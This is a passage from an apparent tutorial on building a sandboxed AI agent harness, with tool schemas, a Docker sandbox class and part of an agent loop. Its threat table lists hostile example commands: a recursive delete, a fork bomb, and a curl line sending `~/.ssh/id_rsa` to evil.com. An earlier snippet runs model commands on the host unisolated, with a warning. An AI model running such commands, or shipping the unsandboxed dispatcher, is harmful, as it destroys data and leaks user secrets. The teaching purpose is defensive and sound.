+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>        <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;object&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>            <span class="s2">&quot;properties&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;File path&quot;</span><span class="p">}},</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>            <span class="s2">&quot;required&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;path&quot;</span><span class="p">]}}},</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span> <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;file_write&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>        <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Write content to a file (create or overwrite).&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>        <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;object&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>            <span class="s2">&quot;properties&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>                <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;File path&quot;</span><span class="p">},</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>                <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Content to write&quot;</span><span class="p">}},</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>            <span class="s2">&quot;required&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;path&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">]}}},</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>    <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span> <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;shell_exec&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>        <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Run a shell command; return stdout and stderr.&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>        <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;object&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>            <span class="s2">&quot;properties&quot;</span><span class="p">:</span> <span class="p">{</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>                <span class="s2">&quot;command&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Shell command&quot;</span><span class="p">},</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>                <span class="s2">&quot;timeout_s&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;integer&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Max seconds&quot;</span><span class="p">,</span> <span class="s2">&quot;default&quot;</span><span class="p">:</span> <span class="mi">30</span><span class="p">}},</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>            <span class="s2">&quot;required&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;command&quot;</span><span class="p">]}}},</span>
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">]</span>
+</code></pre></div>
+<blockquote>
+<p><strong>Warning:</strong> The <code>shell_exec</code> tool below runs commands on the <strong>host machine</strong> with no isolation. We will fix this in loop 3. Never ship this to production.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">subprocess</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">TOOL_DISPATCH</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="s2">&quot;file_read&quot;</span><span class="p">:</span>  <span class="k">lambda</span> <span class="n">path</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="s2">&quot;file_write&quot;</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">path</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="p">(</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>        <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">),</span> <span class="sa">f</span><span class="s2">&quot;Wrote </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="s2">&quot;shell_exec&quot;</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">command</span><span class="p">,</span> <span class="n">timeout_s</span><span class="o">=</span><span class="mi">30</span><span class="p">:</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        <span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="n">timeout</span><span class="o">=</span><span class="n">timeout_s</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">}</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="k">def</span> <span class="nf">execute_tool_call</span><span class="p">(</span><span class="n">tool_call</span><span class="p">):</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    <span class="k">return</span> <span class="n">TOOL_DISPATCH</span><span class="p">[</span><span class="n">tool_call</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]](</span><span class="o">**</span><span class="n">tool_call</span><span class="p">[</span><span class="s2">&quot;arguments&quot;</span><span class="p">])</span>
+</code></pre></div>
+<h3 id="check-yourself_1">Check yourself<a class="headerlink" href="#check-yourself_1" title="Permanent link">&para;</a></h3>
+<ol>
+<li>What are the three parts of the tool-calling protocol?</li>
+<li>Why does <code>shell_exec</code> need a <code>timeout_s</code> parameter?</li>
+<li>What happens if the model invents a tool name that is not in <code>TOOL_DISPATCH</code>?</li>
+</ol>
+<hr />
+<h2 id="concept-loop-3-sandboxed-execution">Concept loop 3: Sandboxed execution<a class="headerlink" href="#concept-loop-3-sandboxed-execution" title="Permanent link">&para;</a></h2>
+<h3 id="concept_2">Concept<a class="headerlink" href="#concept_2" title="Permanent link">&para;</a></h3>
+<p>The <code>shell_exec</code> tool from loop 2 is a loaded gun. The model can emit <code>rm -rf /</code>, install malware, or exfiltrate secrets through a curl command. LLM-generated code is <em>untrusted by definition</em> — the model is a stochastic process, not a vetted developer.</p>
+<p>The threat model has three axes:</p>
+<table>
+<thead>
+<tr>
+<th>Threat</th>
+<th>Example</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Destructive commands</strong></td>
+<td><code>rm -rf /home</code>, <code>DROP TABLE users</code></td>
+<td>Data loss, system damage</td>
+</tr>
+<tr>
+<td><strong>Exfiltration</strong></td>
+<td><code>curl -X POST https://evil.com -d @~/.ssh/id_rsa</code></td>
+<td>Secret leakage</td>
+</tr>
+<tr>
+<td><strong>Resource exhaustion</strong></td>
+<td><code>:(){ :\|:&amp; };:</code> (fork bomb), infinite loop</td>
+<td>Host denial of service</td>
+</tr>
+</tbody>
+</table>
+<p>Sandboxes solve all three by running untrusted code in an isolated environment with controlled resources and no network access (or restricted network access).</p>
+<p><strong>Common sandbox approaches:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Approach</th>
+<th>Isolation level</th>
+<th>Startup time</th>
+<th>Use case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Docker containers</td>
+<td>Process + filesystem</td>
+<td>~1s</td>
+<td>Most agent frameworks</td>
+</tr>
+<tr>
+<td>Firecracker microVMs (E2B)</td>
+<td>Full VM</td>
+<td>~150ms</td>
+<td>Multi-tenant cloud</td>
+</tr>
+<tr>
+<td>Piston</td>
+<td>Container + seccomp</td>
+<td>~200ms</td>
+<td>Polyglot code execution</td>
+</tr>
+<tr>
+<td>gVisor / Kata</td>
+<td>Kernel-level</td>
+<td>~500ms</td>
+<td>Defense in depth</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Key idea:</strong> A sandbox is not a feature — it is a <em>requirement</em>. Any agent that runs LLM-generated code without isolation is one hallucination away from a production outage.</p>
+</blockquote>
+<h3 id="worked-example_2">Worked example<a class="headerlink" href="#worked-example_2" title="Permanent link">&para;</a></h3>
+<p>E2B (short for "environment to browser") provides cloud sandboxes purpose-built for AI agents. Each sandbox is a Firecracker microVM with its own filesystem, network namespace, and resource limits.</p>
+<h3 id="example-5-3-sandboxed-code-execution-with-docker">Example 5-3. Sandboxed code execution with Docker<a class="headerlink" href="#example-5-3-sandboxed-code-execution-with-docker" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">import</span> <span class="nn">subprocess</span><span class="o">,</span> <span class="nn">tempfile</span><span class="o">,</span> <span class="nn">os</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="k">class</span> <span class="nc">DockerSandbox</span><span class="p">:</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Minimal sandbox using Docker for LLM-generated code.&quot;&quot;&quot;</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    <span class="n">IMAGE</span> <span class="o">=</span> <span class="s2">&quot;python:3.12-slim&quot;</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">DEFAULTS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;timeout_s&quot;</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span> <span class="s2">&quot;mem_limit&quot;</span><span class="p">:</span> <span class="s2">&quot;256m&quot;</span><span class="p">,</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>                <span class="s2">&quot;cpu_quota&quot;</span><span class="p">:</span> <span class="mi">50000</span><span class="p">,</span> <span class="s2">&quot;network&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">}</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">**</span><span class="n">overrides</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>        <span class="n">cfg</span> <span class="o">=</span> <span class="p">{</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">DEFAULTS</span><span class="p">,</span> <span class="o">**</span><span class="n">overrides</span><span class="p">}</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>        <span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="n">mode</span><span class="o">=</span><span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="s2">&quot;.py&quot;</span><span class="p">,</span> <span class="n">delete</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>            <span class="n">host_path</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">name</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>        <span class="n">net</span> <span class="o">=</span> <span class="s2">&quot;--network=none&quot;</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">cfg</span><span class="p">[</span><span class="s2">&quot;network&quot;</span><span class="p">]</span> <span class="k">else</span> <span class="s2">&quot;&quot;</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>        <span class="n">cmd</span> <span class="o">=</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&quot;docker run --rm --memory=</span><span class="si">{</span><span class="n">cfg</span><span class="p">[</span><span class="s1">&#39;mem_limit&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> &quot;</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>               <span class="sa">f</span><span class="s2">&quot;--cpu-quota=</span><span class="si">{</span><span class="n">cfg</span><span class="p">[</span><span class="s1">&#39;cpu_quota&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">net</span><span class="si">}</span><span class="s2"> --read-only &quot;</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>               <span class="sa">f</span><span class="s2">&quot;-v </span><span class="si">{</span><span class="n">host_path</span><span class="si">}</span><span class="s2">:/sandbox/script.py:ro &quot;</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>               <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">IMAGE</span><span class="si">}</span><span class="s2"> python /sandbox/script.py&quot;</span><span class="p">)</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>        <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>            <span class="n">r</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>                               <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">cfg</span><span class="p">[</span><span class="s2">&quot;timeout_s&quot;</span><span class="p">])</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;stdout&quot;</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="s2">&quot;stderr&quot;</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s2">&quot;exit_code&quot;</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">returncode</span><span class="p">}</span>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;stdout&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;stderr&quot;</span><span class="p">:</span> <span class="s2">&quot;TIMEOUT&quot;</span><span class="p">,</span> <span class="s2">&quot;exit_code&quot;</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">}</span>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>        <span class="k">finally</span><span class="p">:</span>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>            <span class="n">os</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">host_path</span><span class="p">)</span>
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="c1"># Usage</span>
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="n">sandbox</span> <span class="o">=</span> <span class="n">DockerSandbox</span><span class="p">()</span>
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="n">result</span> <span class="o">=</span> <span class="n">sandbox</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&quot;print(&#39;Hello from the sandbox!&#39;)&quot;</span><span class="p">)</span>
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="c1"># =&gt; {&quot;stdout&quot;: &quot;Hello from the sandbox!\n&quot;, &quot;stderr&quot;: &quot;&quot;, &quot;exit_code&quot;: 0}</span>
+</code></pre></div>
+<p>Key design decisions:</p>
+<ul>
+<li><strong><code>--network=none</code></strong> blocks exfiltration. The code cannot phone home.</li>
+<li><strong><code>--read-only</code></strong> prevents writes to the container filesystem (the script is mounted read-only).</li>
+<li><strong><code>--memory</code> and <code>--cpu-quota</code></strong> cap resource consumption. Fork bombs die fast.</li>
+<li><strong><code>timeout</code></strong> on the Python side kills the container if Docker's own limits fail.</li>
+</ul>
+<blockquote>
+<p><strong>Pitfall:</strong> Docker is not a security boundary by default. A privileged container can escape to the host. Always run with <code>--no-new-privileges</code>, drop all capabilities, and use a non-root user in production. For multi-tenant workloads, prefer microVM isolation (E2B, Firecracker).</p>
+</blockquote>
+<h3 id="check-yourself_2">Check yourself<a class="headerlink" href="#check-yourself_2" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Name the three threat axes that sandboxes address.</li>
+<li>Why is <code>--network=none</code> critical for untrusted code?</li>
+<li>What is the difference between Docker container isolation and Firecracker microVM isolation?</li>
+</ol>
+<hr />
+<h2 id="concept-loop-4-the-harness-pattern-assembling-the-full-loop">Concept loop 4: The harness pattern — assembling the full loop<a class="headerlink" href="#concept-loop-4-the-harness-pattern-assembling-the-full-loop" title="Permanent link">&para;</a></h2>
+<h3 id="concept_3">Concept<a class="headerlink" href="#concept_3" title="Permanent link">&para;</a></h3>
+<p>Loops 1–3 gave us the parts: tool-calling (the protocol), tool schemas (the contract), and sandboxed execution (the safety net). Now we assemble them into the <strong>full harness pattern</strong> — the architecture that every production agent framework uses, whether it admits it or not.</p>
+<p>This pattern extends the reliability harness from Section 2.3 (budget gates, circuit breakers, checkpoints) with two new layers:</p>
+<ul>
+<li><strong>Tool dispatch</strong> — routes model tool calls to the correct executor.</li>
+<li><strong>Sandbox runtime</strong> — runs untrusted code in isolation.</li>
+</ul>
+<p>And it connects to Section 4.2's orchestration/execution split: the <em>orchestrator</em> decides which tools to call; the <em>harness</em> executes those calls safely.</p>
+<pre class="mermaid"><code>flowchart TB
+    subgraph Orchestrator ["Orchestrator (Section 4.2)"]
+        Plan[Plan next step]
+    end
+
+    subgraph Harness ["Harness (Section 2.3 + this section)"]
+        Budget{Budget OK?}
+        Model[Model call with tool schemas]
+        Parse[Parse tool_call response]
+        CB{Circuit breaker}
+        Dispatch[Tool dispatch router]
+        Sandbox[Sandboxed execution]
+        Verify[Verify result]
+        Checkpoint[Save checkpoint]
+    end
+
+    Plan --&gt; Budget
+    Budget --&gt;|no| Halt([Halt &amp; report])
+    Budget --&gt;|yes| Model
+    Model --&gt; Parse
+    Parse --&gt; CB
+    CB --&gt;|open| Halt
+    CB --&gt;|closed| Dispatch
+    Dispatch --&gt;|safe tool| Dispatch
+    Dispatch --&gt;|code execution| Sandbox
+    Sandbox --&gt; Verify
+    Dispatch --&gt; Verify
+    Verify --&gt;|pass| Checkpoint
+    Verify --&gt;|fail| CB
+    Checkpoint --&gt; Plan</code></pre>
+<p>The loop runs until the orchestrator declares the task complete, the budget is exhausted, or the circuit breaker trips. Every iteration leaves a checkpoint so the loop can resume after crashes (Section 2.3, concept loop 5).</p>
+<blockquote>
+<p><strong>Key idea:</strong> The harness pattern is not a framework — it is a <em>design pattern</em>. You can implement it in 100 lines of Python or adopt it from LangChain, CrewAI, or Claude Code's internal loop. The architecture is the same; only the plumbing differs.</p>
+</blockquote>
+<h3 id="worked-example_3">Worked example<a class="headerlink" href="#worked-example_3" title="Permanent link">&para;</a></h3>
+<p>We now wire the tool schemas from Example 5-2, the sandbox from Example 5-3, and the harnessed loop skeleton from Section 2.3 into a single working agent.</p>
+<h3 id="example-5-4-complete-harnessed-agent-loop-with-tool-calling-and-sandbox">Example 5-4. Complete harnessed agent loop with tool-calling and sandbox<a class="headerlink" href="#example-5-4-complete-harnessed-agent-loop-with-tool-calling-and-sandbox" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">time</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="k">class</span> <span class="nc">HarnessedAgent</span><span class="p">:</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Full harness: budget + circuit breaker + tool dispatch + sandbox.&quot;&quot;&quot;</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">model_fn</span><span class="p">,</span> <span class="n">tools</span><span class="p">,</span> <span class="n">sandbox</span><span class="p">,</span> <span class="n">max_tokens</span><span class="o">=</span><span class="mi">50_000</span><span class="p">,</span> <span class="n">max_time_s</span><span class="o">=</span><span class="mi">300</span><span class="p">):</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">model_fn</span> <span class="o">=</span> <span class="n">model_fn</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">tools</span> <span class="o">=</span> <span class="n">tools</span>          <span class="c1"># dict of {name: callable}</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span> <span class="o">=</span> <span class="n">sandbox</span>      <span class="c1"># DockerSandbox instance</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">max_tokens</span> <span class="o">=</span> <span class="n">max_tokens</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">max_time_s</span> <span class="o">=</span> <span class="n">max_time_s</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">goal</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>        <span class="n">tokens_used</span><span class="p">,</span> <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>        <span class="n">messages</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">goal</span><span class="p">}]</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>        <span class="n">recent_actions</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>        <span class="k">for</span> <span class="n">step</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>  <span class="c1"># hard cap</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>            <span class="c1"># --- Budget gate ---</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>            <span class="k">if</span> <span class="n">tokens_used</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">max_tokens</span><span class="p">:</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_halt</span><span class="p">(</span><span class="s2">&quot;budget_exhausted&quot;</span><span class="p">,</span> <span class="n">step</span><span class="p">,</span> <span class="n">tokens_used</span><span class="p">)</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">max_time_s</span><span class="p">:</span>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_halt</span><span class="p">(</span><span class="s2">&quot;timeout&quot;</span><span class="p">,</span> <span class="n">step</span><span class="p">,</span> <span class="n">tokens_used</span><span class="p">)</span>
